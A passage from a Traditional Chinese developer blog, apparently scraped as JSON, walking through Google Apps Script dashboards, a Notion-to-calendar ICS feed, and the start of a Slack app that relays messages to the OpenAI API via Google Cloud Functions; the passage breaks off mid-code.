gaPropertyId = \"318495208\";function debug() { cronjob();}function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}function doGet(e) { return HtmlService.createTemplateFromFile('Web_DailyReport_ Scaffolding').evaluate();}function getDailyReportBody() { const html = HtmlService.createTemplateFromFile('Web_DailyReport_Body').evaluate().getContent(); return html;}// FOR POST// function doPost(e) {// ref: https://developers.google.com/apps-script/guides/web?hl=zh-tw// }// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}新增 Web_DailyReport_ Scaffolding.html Web Dashboard 框架，由於我們的戰情室螢幕要做到自動更新內容，因此我們建立一個 Web 骨架，在其中定時用 Ajax 去撈取 HTML 內容：&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;script&gt; function onSuccess(html) { if (html != null) { var div = document.getElementById('result'); div.innerHTML = html; } } setInterval(()=&gt;{ google.script.run.withSuccessHandler(onSuccess).getDailyReportBody() }, 1000 * 60 * 60 * 1); google.script.run.withSuccessHandler(onSuccess).getDailyReportBody(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"result\"&gt;Loading...&lt;/div&gt; &lt;/body&gt;&lt;/html&gt;新增 Web_DailyReport_Body.html 實際渲染資料成 HTML 的地方：&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;style&gt; table { border-collapse: collapse; width: 100%; text-align: center; } th, td { border: 1px solid #000000; padding: 8px; text-align: center; font-size: 36px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 style=\"text-align:center\"&gt;ZHGCHG.LI&lt;/h1&gt; &lt;table id=\"dataTable\"&gt; &lt;tbody&gt; &lt;? // 顯示近 7 天數據 const dashboard = new WebDailyReport(targetGoogleSheetID, 7); // 從昨天開始 const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const data = dashboard.allData(yesterday); for(const rowIndex in data) { const row = data[rowIndex]; ?&gt; &lt;tr&gt; &lt;? for(const columnIndex in row) { const column = row[columnIndex]; ?&gt; &lt;td style=\"background-color: &lt;?=column[\"backgroundColor\"]?&gt;; color: &lt;?=column[\"color\"]?&gt;; text-align: &lt;?=column[\"horizontalAlignment\"]?&gt;;\"&gt; &lt;?=column[\"value\"]?&gt; &lt;/td&gt; &lt;? } ?&gt; &lt;/tr&gt; &lt;? } ?&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; &lt;/body&gt;&lt;/html&gt; 請注意，我們是從昨天開始往後撈 7 天的數據做比對，不會顯示今天的數據。完成以上步驟後的專案檔案目錄如下：測試部署：點擊專案右上角「部署」-&gt;「測試部署作業」 部署完成點擊網址即可查看測試結果。 請注意此網址僅共一次性測試使用，如果程式碼有調整要再重新點一次測試部署作業。卡在 Loading… 內容沒出來或出現伺服器錯誤，可以回到編輯器的「執行項目」頁籤查看錯誤訊息：完成正式部署：如果測試沒問題就可以完成正式部署，釋出網址。點擊專案右上角「部署」-&gt;「新增部署作業」-&gt; 左上角「選取類型」-&gt;「網頁應用程式」： 執行身份：預設為當前帳號(同 Google Apps Script 使用者) 誰可以存取：設為所有人只要知道網址的人都能存取、也可設為僅組織可存取，會先要求 Google 登入才能存取。 部署完成，取得網址。程式碼有更動需重新部署才會生效：請注意當程式碼有變動時，需要重新部署(網址不會變)，更動才會生效，否則會一直是舊的。點擊專案右上角「部署」-&gt;「管理部署作業」：點擊右上角「筆🖊️ ICON」-&gt; 「版本」 -&gt;「建立新版本」-&gt;「部署」。部署完成後點擊網址，或回到原網址重新整理即可看到新的更動結果。🎉🎉完成！至此我們所有的 RPA 需求皆已完成。🎉🎉最終成果：(改程式回補本月數據，否則全新資料下只有昨日一筆) https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec完整 Google Sheet Demo： Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec Google Apps Script: https://script.google.com/home/projects/1vHgXPTV_q8MC75FVzAEtzD2JPVnPBpMfFXbjZR7SLMVjoEH1FcjKlo8l/edit最後附上其他日常生活應用：Robotic Process Automation with Google Apps Script — Github Repo Star Notifier to LineRobotic Process Automation with Google Apps Script — Notion Database to Calendar之前簡易實現的 Notion to Calendar 功能。 實現方式是，我去串接 Notion API 撈取 Database 資料並套用產出 ICS 格式網頁，部署成公開的網頁；將此網址新增到 Apple Calendar 即可。Main.gs :// Constant variablesconst notionToken = \"XXXXX\";const safeToken = \"XXXXX\";function doGet(e) { const ics = HtmlService.createTemplateFromFile('ics'); if (e.parameter.token != safeToken) { return ContentService.createTextOutput(\"Access Denied!\"); } ics.events = getQuickNote(); return ContentService.createTextOutput(ics.evaluate().getContent()).setMimeType(ContentService.MimeType.ICAL);}function debug() { const ics = HtmlService.createTemplateFromFile('ics'); ics.events = getQuickNote(); Logger.log(ics.evaluate().getContent());}function getQuickNote() { // YOUR FILTER Condition: const payload = { \"filter\": { \"and\": [ { \"property\": \"Date\", \"date\": { \"is_not_empty\": true } } , { \"property\": \"Name\", \"title\": { \"is_not_empty\": true } } ] } }; const result = getDatabase(YOUR_DATABASE_ID, payload); var events = []; for (const index in result.results) { const item = result.results[index] const properties = item.properties; const id = item['id']; const create = toICSDate(item[\"created_time\"]); const edit = toICSDate(item[\"last_edited_time\"]); const startDate = properties['Date']['date']['start']; const start = toICSDate(startDate); var endDate = properties['Date']?.['date']?.['end']; if (endDate == null) { endDate = startDate; } const end = toICSDate(endDate); const type = properties['Type']?.['multi_select']?.[0]?.['name']; const title = \"[\"+type+\"] \"+properties?.['Name']?.['title']?.[0]?.['plain_text']; const description = item['url']; events.push( { \"id\":id, \"create\":create, \"edit\":edit, \"start\":start, \"end\":end, \"title\":title, \"description\":description } ) } return events;}// TO UTC Datefunction toICSDate(date) { const icsDate = new Date(date); icsDate.setHours(icsDate.getHours() - 8); return Utilities.formatDate(icsDate, \"GMT+8\", \"yyyyMMdd'T'HHmmss'Z'\");// 20240304T132300Z}// Notionfunction getDatabase(id, payload) { const url = 'https://api.notion.com/v1/databases/'+id+'/query/'; const options = { method: 'post', headers: { 'Authorization': 'Bearer '+notionToken, 'Content-Type': 'application/json', 'Notion-Version': '2022-06-28' }, payload: JSON.stringify(payload) }; const result = UrlFetchApp.fetch(url, options); return JSON.parse(result.getContentText());}ics.html :BEGIN:VCALENDARPRODID:-//Google Inc//Google Calendar 70.9054//ENVERSION:2.0CALSCALE:GREGORIANMETHOD:PUBLISHX-WR-CALNAME:NotionCalendarX-WR-TIMEZONE:Asia/TaipeiBEGIN:VTIMEZONETZID:Asia/TaipeiX-LIC-LOCATION:Asia/TaipeiBEGIN:STANDARDTZOFFSETFROM:+0800TZOFFSETTO:+0800TZNAME:CSTDTSTART:19700101T000000END:STANDARDEND:VTIMEZONE&lt;? for(const eventIndex in events) { const event = events[eventIndex]; ?&gt;BEGIN:VEVENTDTSTART:&lt;?=event[\"start\"]?&gt;DTEND:&lt;?=event[\"end\"]?&gt;DTSTAMP:&lt;?=event[\"edit\"]?&gt;UID:&lt;?=event[\"id\"]?&gt;CREATED:&lt;?=event[\"create\"]?&gt;LAST-MODIFIED:&lt;?=event[\"edit\"]?&gt;SEQUENCE:0STATUS:CONFIRMEDSUMMARY:&lt;?=event[\"title\"]?&gt;DESCRIPTION:&lt;?=event[\"description\"]?&gt;TRANSP:OPAQUEEND:VEVENT&lt;? }?&gt;END:VCALENDAR同前文，部署成網頁服務，點擊專案右上角「部署」-&gt;「新增部署作業」-&gt; 左上角「選取類型」-&gt;「網頁應用程式」： 誰可以存取要選所有人，因為無法在加 Calendar 時進行 Google 登入驗證。將網址新增至行事曆訂閱，完成 🎉🎉🎉🎉 ！工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,357 Total Views Last Statistics Date: 2025-01-19 | 2,291 Views on Medium. " }, { "title": "Slack & ChatGPT Integration", "url": "/posts/bd94cc88f9c9/", "categories": "ZRealm Dev.", "tags": "cloud-functions, ios-app-development, python, chatgpt, slack", "date": "2024-02-16 21:17:01 +0800", "snippet": "Slack &amp; ChatGPT Integration自行打造 ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)背景最近在團隊內推廣運用 Generative AI 提升工作效率，初步只希望達成 AI Assistant (ChatGPT 功能)，從減少日常資料查詢、整理繁瑣資料、手工處理資料...", "content": "Slack &amp; ChatGPT Integration自行打造 ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)背景最近在團隊內推廣運用 Generative AI 提升工作效率，初步只希望達成 AI Assistant (ChatGPT 功能)，從減少日常資料查詢、整理繁瑣資料、手工處理資料的時間，以提升工作效率；希望是工程師、設計師、PM、行銷…都能自由使用的。最簡單的方法就是直接買 ChatGPT Team 方案，一個席位 $25 美金一年；但由於尚不確定大家的使用頻率(量)及希望能在外來與更多協作、開發流程進行整合，所以改採用 OpenAI API 方式，再透過其他服務封裝整合供團隊成員使用。OpenAI API Key 可從 此頁面產生 ，Key 沒有分對應的 Model 版本，使用時才需指定要使用的 Model 版本並產生對應的 Token 費用。 我們需要一個服務能自行設定 OpenAI API Key 並使用該 Key 進行類 ChatGPT 使用。 不管是 Chrome Extension 或 Slack App 都蠻難找到能自行設定 OpenAI API Key 的服務，大部分服務都是要賣他們自己的訂閱制，讓使用者自訂 API Key 等於賺不到錢純做慈善。[Chrome Extension] SidebarGPT安裝完後可到設定 -&gt; General -&gt; 填入 OpenAI API Key。可從瀏覽器小工具欄、側邊 Icon 直接呼叫出聊天界面，直接使用：[Chrome Extension] OpenAI Translator如果只有翻譯需求可使用這個，能自訂 OpenAI API Key 用於翻譯。另外他是 開源專案 ，並同時提供 macOS/Windows 桌面版程式：Chrome Extension 的優點是快速簡單方便，直接裝直接使用；缺點是需要將 API Key 提供給所有成員，難以管控外洩問題，還有使用第三方服務也難以保證大家的資料安全。[Self-hosted] LibreChat研發部同事推薦的 OpenAI API Chat 封裝服務，提供身份認證使用及幾乎還原 ChatGPT 使用介面、功能比 ChatGPT 更強大的開源專案。只需專案、裝好 Docker、設定好 .env、啟 Docker 服務就能直接透過網站連入使用。 試了一下簡直無懈可擊，就是本地版 ChatGPT 服務；要說缺點的話就只有需要伺服器部署服務吧；如果沒其他考量，可以直接使用此開源專案。Slack App其實 LibreChat 服務起起來放上伺服器就已經達成效果了，但是靈光一閃想說如果能整合在日常工具當中是不是更方便？加上公司伺服器有嚴格的權限設定，不太能隨意起服務。當時也沒想太多，想說 Slack App 的 OpenAI API 整合服務應該很多，找一個設定一下就好；沒想到事情沒有那麼簡單。Google 搜尋只找到一篇 Slack x OpenAI 2023/03 官方的新聞稿「 Why we built the ChatGPT app for Slack 」及一些 Beta 圖片：https://www.salesforce.com/news/stories/chatgpt-app-for-slack/看起來功能非常完整而且能大大提升工作效率，不過截自 2024/01 為止尚無釋出的消息，文末提供的 Beta 註冊連結 也已經失效，暫時沒有下文。(還是微軟想先讓 Teams 支援？)[2024/02/14 Update]： 看 Slack 官方新聞 猜測與 ChatGPT(OpenAI) 整合的功能應該已經被放棄或改整合成 Slack AI 。Slack Apps因無官方的 App 轉而搜尋第三方開發者的 App，搜尋並試用了幾個都碰壁；符合的 App 不多就算了，也沒有一個是能提供自訂 Key 功能的，每個都是做來賣服務、賣錢的。自行實現 ChatGPT OpenAI API for Slack App之前有一些 Slack App 開發經驗，決定自己動手做。 ⚠️聲明⚠️ 本文是以串接 OpenAI API 為例演示如何建立 Slack App 和快速使用 Google Cloud Funtions 來達成需求，Slack App 有需多應用可做，大家可以自由發揮。 ⚠️⚠️ Google Cloud Functions，Function as a Service (FaaS) 的優點是方便快速、有免費額度，程式寫好就能直接部署執行、自動擴充，缺點是服務環境由 GCP 控制，當服務太久沒被呼叫會進入休眠，此時再次呼叫會進入 Cold Start 冷啟動，需要較長的反應時間；另外也較難起多個服務互相使用。 更完整或使用需求量大的話還是建議自己起 VM (App Engine) 架 Server 跑服務。最終成果圖 完整 Cloud Functions Python 程式碼、Slack App 設定已附在文末，懶得一步一步看的朋友可快速前往查閱。Step 1. 建立 Slack App前往 Slack App ：點擊「Create New App」選擇「From scratch」輸入「App Name」、選擇要加入的 Workspace。建立完成後先到「OAuth &amp; Permissions」新增 Bot 需要的權限。下滑找到「Scopes」區塊，點擊「Add an OAuth Scope」搜尋加入以下幾個權限： chat:write im:history im:read im:writeBot 權限加完之後點擊左方「Install App」-&gt;「Install to Workspace」爾後如果 Slack App 有新增其他權限，都需要再點擊一次「Reinstall」才會生效。 但請放心，Bot Token 不會因為重新安裝而改變。Slack Bot Token 權限設定好之後，前往「App Home」：下滑找到「Show Tabs」區塊，啟用「Messages Tab」及「Allow users to send Slash commands and messages from the messages tab」(這個沒勾一樣不能傳訊息，會顯示「Sending messages to this app has been turned off.」)回到 Slack Workspace，按「Command+R」更新畫面就能看到新建立的 Slack App 和訊息輸入匡：此時傳送訊息給 App 還沒有任何功能。啟用 Event Subscriptions 功能再來，我們需要啟用 Slack App 的事件訂閱功能，當指定事件發生時會打 API 到指定 URL。新增 Google Cloud FuntionsRequest URL 的部分， Google Cloud Funtions 就要上場了。設定好專案、帳單資訊後點擊「Create Function」Function name 輸入專案名稱、Authentication 選擇「Allow unauthenticated invocations」意即知道網址就能存取。 如果你無法建立 Function 或無法更改 Authentication 代表你的 GCP 帳號沒有完整的 Google Cloud Functions 權限，需要請組織管理員在原本的身份之外額外加上 Cloud Functions Admin 的權限，才能使用。Runtime: Python 3.8 or 更高main.py ：import functions_framework@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(request_json) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) return (\"Access Denied!\", 400, headers)requirements.txt 輸入以下依賴：functions-framework==3.*requests==2.31.0openai==1.9.0目前還沒有什麼功能，只是讓 Slack App 能通過 Event Subscriptions 啟用驗證，可以直接點擊「Deploy」完成首次部署。 ⚠️如果你不熟悉 Cloud Functions 編輯器，可先下拉到文章底部查看補充內容。等待部署完成後（綠勾勾） ，複製 Cloud Functions URL：將 Request URL 貼回 Slack App Enable Events。如果沒問題就會出現「Verified」完成驗證。這邊做的事是收到 Slack 發來的驗證請求時：{ \"token\": \"Jhj5dZrVaK7ZwHHjRyZWjbDl\", \"challenge\": \"3eZbrw1aBm2rZgRNFdxV2595E9CY3gmdALWMmHkvFXO7tYXAYM8P\", \"type\": \"url_verification\"}回應 challenge 欄位內容，就能通過驗證。啟用成功後往下滑找到「Subscribe to bot events」區塊，點擊「Add Bot User Event」新增「message.im」權限。新增完全權限後點擊上方「reinstall your app」連結重新安裝 Slack App 到 Workspace 後，Slack App 的設定就告一段落囉。也可以去「App Home」或「Basic Information」客製化 Slack App 的名稱與大頭貼。Basic InformationStep 2. 完善 OpenAI API 與 Slack App 串接 (Direct 訊息)首先我們先要取得必備的 OPENAI API KEY 與 Bot User OAuth Token 兩個 Key。 OPENAI API KEY ： OpenAI API key page . Bot User OAuth Token ： OAuth Tokens for Your Workspace處理 Direct Message (IM) Event &amp; 串接 OpenAI API 回應當使用者在與 Slack App 訊息傳送時會收到以下 Event Json Paylod ：{ \"token\": \"XXX\", \"team_id\": \"XXX\", \"context_team_id\": \"XXX\", \"context_enterprise_id\": null, \"api_app_id\": \"XXX\", \"event\": { \"client_msg_id\": \"XXX\", \"type\": \"message\", \"text\": \"你好\", \"user\": \"XXX\", \"ts\": \"1707920753.115429\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"orfng\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"你好\" } ] } ] } ], \"team\": \"XXX\", \"channel\": \"XXX\", \"event_ts\": \"1707920753.115429\", \"channel_type\": \"im\" }, \"type\": \"event_callback\", \"event_id\": \"XXX\", \"event_time\": 1707920753, \"authorizations\": [ { \"enterprise_id\": null, \"team_id\": \"XXX\", \"user_id\": \"XXX\", \"is_bot\": true, \"is_enterprise_install\": false } ], \"is_ext_shared_channel\": false, \"event_context\": \"4-XXX\"}基於以上 Json Payload，我們可以完善 Slack 訊息到 OpenAI API 再到回覆 Slack 訊息的串接：Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(request_json) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看:現在你已經可以進行類 ChatGPT 與 OpenAI API 進行問與答了。增加中斷 Stream Response 功能節省 Token實現方式有很多種，可在同條討論串下如果還沒回應完，使用者又輸入新訊息則中斷之前的 Response 抑或是點擊訊息增加中斷回應的 Shortcut。本文以新增「訊息中斷」Shortcut 為例。不管哪一種中斷方式，核心原理都是相同的，因為我們沒有 Database 儲存產生的訊息、訊息狀態的資訊；因此實現方式是依賴 Slack 訊息的 metadata 欄位 (可存放客製化資訊在指定訊息內)。我們在使用 chat.update API Endpoint 時，如果呼叫成功會回傳當前訊息的文字內容與 metadata，因此我們在上面的 OpenAI API Stream -&gt; Slack Update Message 的程式碼之中多加入判斷修改請求的回應中的 metadata 是否有「中斷」的標記，如果有則中斷 OpenAI Stream Response。首先需要先新增 Slack App 訊息 Shortcut前往 Slack App 管理介面，找到「Interactivity &amp; Shortcuts」區塊，點擊啟用，網址一樣使用同個 Cloud Functions URL。點擊「Create New Shortcut」新增新的訊息 Shortcut。選擇「On messages」。 Name 動作標題： 停止 OpenAI API 產生回應 Short Description 簡介： 停止 OpenAI API 產生回應 Callback ID： abort_openai_api (程式識別用，可自訂)點擊「Create」建立完成後，最後記得點右下「Save Changes」儲存設定。再次點擊上方「reinstall your app」才會生效。回到 Slack 在訊息上點擊右上角「…」就會出現「停止 OpenAI API 產生回應」Shortcut (此時點擊無作用)。當使用者在訊息上按下 Shortcut 會發送一個 Event Json Payload：{ \"type\": \"message_action\", \"token\": \"XXXXXX\", \"action_ts\": \"1706188005.387646\", \"team\": { \"id\": \"XXXXXX\", \"domain\": \"XXXXXX-XXXXXX\" }, \"user\": { \"id\": \"XXXXXX\", \"username\": \"zhgchgli\", \"team_id\": \"XXXXXX\", \"name\": \"zhgchgli\" }, \"channel\": { \"id\": \"XXXXXX\", \"name\": \"directmessage\" }, \"is_enterprise_install\": false, \"enterprise\": null, \"callback_id\": \"abort_openai_api\", \"trigger_id\": \"XXXXXX\", \"response_url\": \"https://hooks.slack.com/app/XXXXXX/XXXXXX/XXXXXX\", \"message_ts\": \"1706178957.161109\", \"message\": { \"bot_id\": \"XXXXXX\", \"type\": \"message\", \"text\": \"高麗菜包 的英文翻譯是 \\\"cabbage wrap\\\"。如果您是將它作為菜名使用，有時候會具體到菜裡的內容來命名，比如 \\\"pork cabbage wrap\\\"（豬肉高麗菜包）或 \\\"vegetable cabbage wrap\\\"（蔬菜高麗菜包）。\", \"user\": \"XXXXXX\", \"ts\": \"1706178957.161109\", \"app_id\": \"XXXXXX\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"eKgaG\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"高麗菜包 的英文翻譯是 \\\"cabbage wrap\\\"。如果您是將它作為菜名使用，有時候會具體到菜裡的內容來命名，比如 \\\"pork cabbage wrap\\\"（豬肉高麗菜包）或 \\\"vegetable cabbage wrap\\\"（蔬菜高麗菜包）。\" } ] } ] } ], \"team\": \"XXXXXX\", \"bot_profile\": { \"id\": \"XXXXXX\", \"deleted\": false, \"name\": \"Rick C-137\", \"updated\": 1706001605, \"app_id\": \"XXXXXX\", \"icons\": { \"image_36\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_36.png\", \"image_48\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_48.png\", \"image_72\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_72.png\" }, \"team_id\": \"XXXXXX\" }, \"edited\": { \"user\": \"XXXXXX\", \"ts\": \"1706187989.000000\" }, \"thread_ts\": \"1706178832.102439\", \"parent_user_id\": \"XXXXXX\" }}完善 Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 